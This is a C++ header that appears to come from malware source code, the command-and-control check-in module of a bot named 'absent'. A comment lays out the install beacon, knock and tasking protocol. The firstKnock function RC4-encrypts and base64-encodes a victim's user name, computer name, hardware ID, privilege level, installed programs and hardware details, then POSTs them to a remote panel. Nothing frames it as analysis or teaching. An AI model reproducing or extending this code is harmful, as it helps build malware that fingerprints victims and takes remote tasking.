#pragma once
/*
	Request - Install (Encrypted + Base64)
	{
		"buildName": "",
		"computerName": "",
		"cpu": "",
		"cpuArchitecture": "",
		"cpuCores": ,
		"gpu": "",
		"hardwareID": "",
		"installPath": "",
		"installedPrograms": [

		],
		"operatingSystem": "",
		"privilege": "",
		"ram": ,
		"userName": "",
		"vram":
	}

	Request - Knock (Encrypted + Base64)
	{
		"hardwareID": "",
		"installPath": ""
	}

	Responce
	{
		"task": (Internal Task ID, 0 for notask),
		"taskId": (GUID for identifying task to panel),
		"taskParm": (optional task parmerters (list)),
	}
*/
#include <string>

namespace absent
{
	namespace panel
	{
		std::string firstKnock(std::string host, std::string path, nlohmann::json info, std::string key)
		{
			absent::crypto::RC4 rc4;
			info["buildName"] = absent::crypto::b64::encode(rc4.crypt(info["buildName"], key).c_str());
			info["hardwareID"] = absent::crypto::b64::encode(rc4.crypt(info["hardwareID"], key).c_str());
			info["userName"] = absent::crypto::b64::encode(rc4.crypt(info["userName"], key).c_str());
			info["computerName"] = absent::crypto::b64::encode(rc4.crypt(info["computerName"], key).c_str());
			info["operatingSystem"] = absent::crypto::b64::encode(rc4.crypt(info["operatingSystem"], key).c_str());
			info["privilege"] = absent::crypto::b64::encode(rc4.crypt(info["privilege"], key).c_str());
			info["installPath"] = absent::crypto::b64::encode(rc4.crypt(info["installPath"], key).c_str());
			info["cpu"] = absent::crypto::b64::encode(rc4.crypt(info["cpu"], key).c_str());
			info["cpuArchitecture"] = absent::crypto::b64::encode(rc4.crypt(info["cpuArchitecture"], key).c_str());
			info["cpuCores"] = absent::crypto::b64::encode(rc4.crypt(info["cpuCores"], key).c_str());
			info["gpu"] = absent::crypto::b64::encode(rc4.crypt(info["gpu"], key).c_str());
			info["ram"] = absent::crypto::b64::encode(rc4.crypt(info["ram"], key).c_str());
			info["vram"] = absent::crypto::b64::encode(rc4.crypt(info["vram"], key).c_str());
			for (int ip = 0; ip < info["installedPrograms"].size(); ip++) {info["installedPrograms"][ip] =  absent::crypto::b64::encode(rc4.crypt(info["installedPrograms"][ip], key).c_str());}
			std::string toSend = absent::crypto::b64::encode(info.dump().c_str());

			return absent::http::post(host, path, toSend);
		}
	}
}